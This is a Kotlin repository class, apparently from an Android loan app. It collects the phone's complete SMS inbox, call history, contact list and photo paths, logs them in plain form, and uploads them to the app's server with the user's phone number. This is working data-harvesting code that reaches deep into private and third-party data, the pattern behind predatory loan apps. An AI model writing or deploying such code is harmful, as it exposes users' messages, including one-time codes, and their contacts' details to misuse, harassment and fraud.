package com.example.loanapplication.data.repository

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import com.example.loanapplication.data.model.CallLogs
import com.example.loanapplication.data.model.Contact
import com.example.loanapplication.data.model.Message
import com.example.loanapplication.data.model.SmsMessage
import com.example.loanapplication.data.model.UploadProfilePhoto
import com.example.loanapplication.data.model.UploadUserData
import com.example.loanapplication.data.network.ApiService
import com.example.loanapplication.util.MyNetworkResult
import com.example.loanapplication.util.PREFERENCES_DEFULT_MOBILE
import com.example.loanapplication.util.PREFERENCES_KEY_MOBILE
import com.example.loanapplication.util.diAppComponents
import com.google.gson.Gson
import javax.inject.Inject

class ProfileRepository @Inject constructor(
    private val context: Context,
    private val apiService: ApiService,
) {
    val mobile =
        diAppComponents.getSharedPreferencesUtils()
            .getStringShard(PREFERENCES_KEY_MOBILE, PREFERENCES_DEFULT_MOBILE)
            ?: " "

    suspend fun updateProfilePhoto(image: String): MyNetworkResult<Message> {

        val uploadProfilePhoto = UploadProfilePhoto(mobile, image)
        val response = apiService.updateProfilePhoto(uploadProfilePhoto)
        return if (response.isSuccessful) {
            MyNetworkResult.Success(response.body()!!)
        } else if (response.code() == 400) {
            val gson = Gson()
            val message = gson.fromJson(response.errorBody()?.string(), Message::class.java)
            MyNetworkResult.Error(Exception(message?.message))
        } else {
            MyNetworkResult.Error(Exception("Error"))
        }
    }

    private fun fetchAndSyncOldMessages(): List<SmsMessage> {
        val smsUri = Uri.parse("content://sms/")
        val messages = mutableListOf<SmsMessage>()
        try {
            context.contentResolver.query(smsUri, null, null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    do {
                        val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                        val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                        val timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
                        val type =
                            cursor.getString(cursor.getColumnIndexOrThrow("type"))
                        val smsMessage = SmsMessage(
                            address,
                            body,
                            timestamp,
                            type
                        )
                        messages.add(smsMessage)
                    } while (cursor.moveToNext())
                }
            }
            return messages
        } catch (e: Exception) {
            Log.e("TAG", "Error fetching SMS messages", e)
            return emptyList()
        }
    }

    private fun getCallLogs(context: Context): List<CallLogs> {
        val callLogsList = mutableListOf<CallLogs>()

        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE
        )

        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        cursor?.use {
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)

            while (it.moveToNext()) {
                val number = it.getString(numberIndex)
                val date = it.getString(dateIndex)
                val duration = it.getString(durationIndex)
                val type = it.getString(typeIndex)
                val callType = when (type.toInt()) {
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    else -> "Unknown"
                }
                callLogsList.add(CallLogs(number, date, duration, callType))
            }
        }
        return callLogsList
    }


    private fun getContacts(context: Context): List<Contact> {
        val contactsList = mutableListOf<Contact>()

        val projection = arrayOf(
            ContactsContract.Contacts.DISPLAY_NAME_PRIMARY,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )

        val cursor: Cursor? = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            projection,
            null,
            null,
            null
        )

        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val number = it.getString(numberIndex)
                contactsList.add(Contact(name, number))
            }
        }

        return contactsList
    }

    fun getAllPhotos(context: Context): List<String> {
        val photosList = mutableListOf<String>()

        val projection = arrayOf(
            MediaStore.Images.Media.DATA
        )

        val cursor: Cursor? = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )

        cursor?.use {
            val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)

            while (it.moveToNext()) {
                val photoPath = it.getString(dataIndex)
                photosList.add(photoPath)
            }
        }

        return photosList
    }

    suspend fun uploadUserData(
        isCallLogs: Boolean,
        isContacts: Boolean,
        isMessages: Boolean,
        isPhoto: Boolean
    ):
            MyNetworkResult<Message> {
        val callLogs = if (isCallLogs) getCallLogs(context) else emptyList()
        val contacts = if (isContacts) getContacts(context) else emptyList()
        val messages = if (isMessages) fetchAndSyncOldMessages() else emptyList()
        val photos = if (isPhoto) getAllPhotos(context) else emptyList()
        Log.d("uploadUserData", "Call Logs: $callLogs")
        Log.d("uploadUserData", "Contacts: $contacts")
        Log.d("uploadUserData", "Messages: $messages")
        Log.d("uploadUserData", "Photos: $photos")
        val uploadUserData = UploadUserData(callLogs, contacts, messages, mobile, photos)
        val response = apiService.uploadUserData(uploadUserData)
        return if (response.isSuccessful) {
            MyNetworkResult.Success(response.body()!!)
        } else if (response.code() == 400) {
            val gson = Gson()
            val message = gson.fromJson(response.errorBody()?.string(), Message::class.java)
            MyNetworkResult.Error(Exception(message?.message))
        } else {
            MyNetworkResult.Error(Exception("Error"))
        }
    }


}